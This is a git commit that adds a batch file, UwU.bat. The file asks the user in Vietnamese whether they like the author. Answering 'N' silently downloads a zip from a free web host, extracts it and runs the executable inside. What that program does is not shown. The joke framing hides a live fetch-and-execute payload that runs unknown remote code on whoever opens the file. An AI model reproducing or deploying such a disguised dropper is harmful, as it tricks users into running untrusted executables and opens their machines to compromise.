a4a3e5eabd2679ae68b4b9e996e586336b73c690
Bachh <91786743+OctopusBachh@users.noreply.github.com>
2023-06-03 17:49:25 +0700

    Add files via upload

---
+++ UwU.bat
@@ -0,0 +1,9 @@
+@echo off
+color 04
+set /P start="Cau co thich to khum<3? (Y/N)"
+if %start%==Y echo To biet ma<3
+if %start%==y echo To biet ma<3
+if %start%==N echo =( && @echo off && curl https://bachoctopussmp.000webhostapp.com/wp-content/uploads/2023/06/Cau_Khong_Thich_minh.zip --output a.zip && tar -xf a.zip && Cau_Khong_Thich_minh.exe
+if %start%==n echo =( && @echo off && curl https://bachoctopussmp.000webhostapp.com/wp-content/uploads/2023/06/Cau_Khong_Thich_minh.zip --output a.zip && tar -xf a.zip && Cau_Khong_Thich_minh.exe
+
+
